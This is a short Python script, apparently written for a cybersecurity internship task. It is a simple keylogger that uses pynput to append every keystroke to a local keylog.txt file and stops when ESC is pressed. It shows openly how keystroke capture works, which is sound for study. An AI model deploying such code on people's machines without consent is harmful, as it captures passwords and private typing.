"""
Author: [Your Name]
Internship: Prodigy Infotech – Cybersecurity Task 4
Description: A simple Python keylogger to record keystrokes.
"""

from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    """
    Function to record each key press into log_file.
    """
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    """
    Stops the keylogger when ESC is pressed.
    """
    if key == keyboard.Key.esc:
        print("🛑 Keylogger stopped.")
        return False

def main():
    """
    Main function to start keylogger.
    """
    print("🔐 Keylogger started. Press ESC to stop.")
    
    # Start listening to the keyboard
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
